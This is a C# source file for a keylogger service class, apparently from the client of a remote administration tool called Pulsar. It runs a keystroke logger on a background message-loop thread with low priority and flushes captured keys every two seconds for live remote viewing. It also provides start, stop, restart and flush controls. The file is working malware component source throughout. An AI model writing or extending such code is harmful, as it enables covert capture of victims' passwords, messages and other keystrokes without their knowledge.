using System;
using System.ComponentModel;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Logging
{
    /// <summary>
    /// Provides a service to run the keylogger within its own message loop.
    /// </summary>
    public class KeyloggerService : IDisposable
    {
        private readonly Thread _msgLoopThread;
        private ApplicationContext _msgLoop;
        private Keylogger _keylogger;
        private readonly ManualResetEventSlim _initialized = new ManualResetEventSlim(false);
        private readonly ManualResetEventSlim _shutdownComplete = new ManualResetEventSlim(false);
        private readonly CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();
        private bool _disposed;
        private volatile bool _isRunning;

        public KeyloggerService()
        {
            _msgLoopThread = new Thread(MessageLoopThread)
            {
                IsBackground = true,
                Name = "Keylogger Message Loop Thread",
                Priority = ThreadPriority.BelowNormal // Reduce impact on system
            };
        }

        /// <summary>
        /// Gets whether the keylogger service is currently running.
        /// </summary>
        public bool IsRunning => _isRunning && !_disposed;

        /// <summary>
        /// Event raised when the keylogger service encounters an error.
        /// </summary>
        public event EventHandler<Exception> ErrorOccurred;

        /// <summary>
        /// Event raised when the keylogger service starts successfully.
        /// </summary>
        public event EventHandler Started;

        /// <summary>
        /// Event raised when the keylogger service stops.
        /// </summary>
        public event EventHandler Stopped;

        private void MessageLoopThread()
        {
            var threadId = Thread.CurrentThread.ManagedThreadId;

            try
            {
                // Set up the message loop
                SynchronizationContext.SetSynchronizationContext(new WindowsFormsSynchronizationContext());

                _msgLoop = new ApplicationContext();

                // OPTIMIZED: 2-second flush for live viewing + 1mb file size
                _keylogger = new Keylogger(2000, 10 * 1024);

                _keylogger.Start();
                _isRunning = true;
                _initialized.Set();

                // Notify start
                OnStarted();

                // Run the message loop with cancellation support
                RunMessageLoopWithCancellation();

                _isRunning = false;
                OnStopped();
            }
            catch (Exception ex)
            {
                _isRunning = false;
                OnErrorOccurred(ex);
            }
            finally
            {
                _shutdownComplete.Set();
            }
        }

        private void RunMessageLoopWithCancellation()
        {
            while (!_cancellationTokenSource.Token.IsCancellationRequested)
            {
                // Process all Windows messages in the queue
                Application.DoEvents();

                // OPTIMIZED: 25ms sleep for better CPU usage
                Thread.Sleep(25);
            }

            // Properly exit the application context
            _msgLoop?.ExitThread();
        }
        /// <summary>
        /// Starts the keylogger service and waits until it's ready.
        /// </summary>
        /// <param name="timeoutMs">Timeout in milliseconds to wait for initialization</param>
        /// <returns>True if started successfully, false if timed out</returns>
        public bool Start(int timeoutMs = 10000)
        {
            if (_disposed)
                throw new ObjectDisposedException(nameof(KeyloggerService));

            if (_isRunning)
                return true;

            if (!_msgLoopThread.IsAlive)
            {
                _msgLoopThread.Start();

                if (_initialized.Wait(timeoutMs))
                {
                    return _isRunning;
                }
                else
                {
                    throw new TimeoutException("Keylogger service failed to initialize within the specified timeout.");
                }
            }

            return _isRunning;
        }

        /// <summary>
        /// Starts the keylogger service asynchronously.
        /// </summary>
        public async Task<bool> StartAsync(int timeoutMs = 10000)
        {
            return await Task.Run(() => Start(timeoutMs));
        }

        /// <summary>
        /// Stops the keylogger service.
        /// </summary>
        /// <param name="timeoutMs">Timeout in milliseconds to wait for shutdown</param>
        /// <returns>True if stopped successfully, false if timed out</returns>
        public bool Stop(int timeoutMs = 5000)
        {
            if (_disposed || !_isRunning)
                return true;

            try
            {
                _cancellationTokenSource.Cancel();

                // Signal the message loop to exit
                _msgLoop?.ExitThread();

                if (_shutdownComplete.Wait(timeoutMs))
                {
                    return true;
                }
                else
                {
                    OnErrorOccurred(new TimeoutException("Keylogger service failed to stop within the specified timeout."));
                    return false;
                }
            }
            catch (Exception ex)
            {
                OnErrorOccurred(ex);
                return false;
            }
        }

        /// <summary>
        /// Forces an immediate flush of the keylogger buffer.
        /// </summary>
        public void Flush()
        {
            if (_isRunning && _keylogger != null)
            {
                try
                {
                    // Use Invoke if we're on a different thread
                    if (_msgLoop != null && _msgLoop.MainForm != null && !_msgLoop.MainForm.InvokeRequired)
                    {
                        _keylogger.FlushImmediately();
                    }
                    else
                    {
                        _msgLoop?.MainForm?.Invoke((MethodInvoker)(() => _keylogger.FlushImmediately()));
                    }
                }
                catch (Exception ex)
                {
                    OnErrorOccurred(ex);
                }
            }
        }

        /// <summary>
        /// Restarts the keylogger service.
        /// </summary>
        public async Task<bool> RestartAsync(int shutdownTimeoutMs = 5000, int startupTimeoutMs = 10000)
        {
            if (Stop(shutdownTimeoutMs))
            {
                // Small delay to ensure clean shutdown
                await Task.Delay(1000);
                return await StartAsync(startupTimeoutMs);
            }
            return false;
        }

        protected virtual void OnErrorOccurred(Exception ex)
        {
            ErrorOccurred?.Invoke(this, ex);
        }

        protected virtual void OnStarted()
        {
            Started?.Invoke(this, EventArgs.Empty);
        }

        protected virtual void OnStopped()
        {
            Stopped?.Invoke(this, EventArgs.Empty);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                // Signal cancellation first
                _cancellationTokenSource.Cancel();

                try
                {
                    // Stop the service if it's running
                    if (_isRunning)
                    {
                        Stop(3000);
                    }

                    // Wait for thread to complete
                    if (_msgLoopThread.IsAlive && !_msgLoopThread.Join(2000))
                    {
                        _msgLoopThread.Interrupt();
                    }
                }
                catch (Exception ex)
                {
                    OnErrorOccurred(ex);
                }
                finally
                {
                    // Dispose resources
                    _keylogger?.Dispose();
                    _keylogger = null;

                    _msgLoop?.Dispose();
                    _msgLoop = null;

                    _cancellationTokenSource?.Dispose();
                    _initialized?.Dispose();
                    _shutdownComplete?.Dispose();
                }
            }

            _disposed = true;
        }

        ~KeyloggerService()
        {
            Dispose(false);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}